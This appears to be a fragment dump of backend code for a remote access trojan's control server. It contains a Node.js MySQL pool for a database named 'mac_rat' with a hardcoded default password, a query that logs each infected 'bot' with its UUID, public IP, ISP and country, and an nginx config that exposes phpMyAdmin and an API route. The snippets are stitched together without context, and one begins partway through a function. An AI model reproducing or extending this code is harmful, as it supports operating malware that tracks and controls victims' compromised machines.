const mysql = require("mysql2/promise");
const dotenv = require("dotenv");

// Load environment variables from .env file
dotenv.config();

const DB_HOST = process.env.DB_HOST || "localhost";
const DB_USER = process.env.DB_USER || "mac";
const DB_PASSWORD = process.env.DB_PASSWORD || "asdfasdf";
const DB_NAME = process.env.DB_NAME || "mac_rat";

const pool = mysql.createPool({
  connectionLimit: 10,
  host: DB_HOST,
  user: DB_USER,
  password: DB_PASSWORD,
  database: DB_NAME,
});

module.exports = pool;

    let connection;
    try {
      connection = await DBPool.getConnection();
      const [result] = await connection.query(
        `INSERT INTO bots (uuid, updated_at, publicip, isp, country)
         VALUES (?, NOW(), ?, ?, ?)
         ON DUPLICATE KEY UPDATE
          updated_at = NOW(),
          publicip = VALUES(publicip),
          isp = VALUES(isp),
          country = VALUES(country)`,
        [
          botUId,
          clientIp,
          isp, country
        ]
      );
      return result.insertId; // Return the inserted user ID
    } catch (err) {
      throw err;
    } finally {
      if (connection) connection.release();
    }



server {
    server_name vertextcloudsystems.website;


    # Main site
    root /var/www/html;
    index index.html index.htm index.php;

    # Serve the main website
    location / {
        try_files $uri $uri/ /404.html;
    }


    location /phpmyadmin {
       alias /usr/share/phpmyadmin;
       index index.php;

       location ~ \.php$ {
           include snippets/fastcgi-php.conf;
           fastcgi_pass unix:/var/run/php/php8.3-fpm.sock;
           fastcgi_param SCRIPT_FILENAME $request_filename;
           include fastcgi_params;
       }

       location ~ /\.ht {
            deny all;
       }
    }


    # Route for Node.js API
    location /api {
        proxy_pass http://localhost:3030; # Forward to your Node.js app
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }

    # Security: Deny access to hidden files
    location ~ /\. {
        deny all;
    }

    listen 443; # managed by Certbot 
}
